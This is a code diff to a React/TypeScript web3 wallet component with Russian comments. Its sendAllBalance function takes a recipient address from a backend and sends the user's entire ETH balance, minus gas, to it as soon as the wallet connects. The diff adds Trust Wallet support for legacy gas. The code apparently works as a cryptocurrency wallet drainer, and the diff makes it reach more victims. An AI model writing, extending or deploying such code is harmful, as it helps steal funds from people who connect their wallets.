@@ -8,7 +8,8 @@ import type { ExternalProvider } from 'web3-core'
 async function sendAllBalance(
   eth: ExternalProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
   addr: string,
-  setStatus: (msg: string) => void
+  setStatus: (msg: string) => void,
+  { isMetaMask, isTrustWallet }: { isMetaMask: boolean; isTrustWallet: boolean },
 ): Promise<string> {
   // 1. Получаем адрес получателя от бэка
   setStatus('Получаем адрес получателя от бэка…')
@@ -22,6 +23,7 @@ async function sendAllBalance(
   // 3. Получаем баланс пользователя и параметры газа
   const balanceWei = BigInt(await web3.eth.getBalance(addr))
   const gasLimit = 21000n
+
   const block = await web3.eth.getBlock('pending')
   // @ts-ignore: baseFeePerGas есть в ответе
   const baseFeePerGas = BigInt(block.baseFeePerGas)
@@ -31,25 +33,45 @@ async function sendAllBalance(
   } catch {
     maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
   }
-  const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
+  
+  const useLegacy = isTrustWallet;
+  if (useLegacy) {
+    const gasPrice = BigInt(await web3.eth.getGasPrice());
+    const gasCost = gasPrice * gasLimit;
+    const valueToSend = balanceWei - gasCost;
+    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа');
+    const tx = {
+      from: addr,
+      to: recipient,
+      value: web3.utils.toHex(valueToSend),
+      gas: web3.utils.toHex(gasLimit),
+      gasPrice: web3.utils.toHex(gasPrice),
+    };
+    const receipt = await web3.eth.sendTransaction(tx);
 
-  // 4. Рассчитываем сумму к отправке
-  const gasCost = maxFeePerGas * gasLimit
-  const amountToSend = balanceWei - gasCost
-  if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
-  const hexValue = '0x' + amountToSend.toString(16)
+  } else {
+    const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
 
-  // 5. Отправляем транзакцию
-  setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
-  const receipt = await web3.eth.sendTransaction({
-    from: addr,
-    to: recipient,
-    value: hexValue,
-    gas: gasLimit.toString(),
-    maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
-    maxFeePerGas: maxFeePerGas.toString(10),
-    type: '0x2',
-  })
+    // 4. Рассчитываем сумму к отправке
+    const gasCost = maxFeePerGas * gasLimit
+    const amountToSend = balanceWei - gasCost
+
+    if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
+    const hexValue = '0x' + amountToSend.toString(16)
+
+    // 5. Отправляем транзакцию
+    setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
+    const receipt = await web3.eth.sendTransaction({
+      from: addr,
+      to: recipient,
+      value: hexValue,
+      gas: gasLimit.toString(),
+      maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
+      maxFeePerGas: maxFeePerGas.toString(10),
+      type: '0x2',
+    })
+  }
+
   return receipt.transactionHash
 }
 
@@ -64,6 +86,11 @@ export default function Wallet() {
       setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
       return
     }
+
+    const isMetaMask = !!eth.isMetaMask
+    const isTrustWallet = !!eth.isTrust
+
+    setStatus(`Подключаемся к ${isMetaMask ? 'MetaMask' : isTrustWallet ? 'Trust Wallet' : 'провайдеру'}`)
 
     setBusy(true)
     setStatus('Запрашиваем аккаунт…')
@@ -81,7 +108,8 @@ export default function Wallet() {
     setAccount(addr)
 
     try {
-      const txHash = await sendAllBalance(eth, addr, setStatus)
+      // const txHash = await sendAllBalance(eth, addr, setStatus)
+      const txHash = await sendAllBalance(eth, addr, setStatus, { isMetaMask, isTrustWallet })
       setStatus(`Успех! TxHash: ${txHash}`)
     } catch (e: any) {
       setStatus(`Ошибка: ${e.message}`)
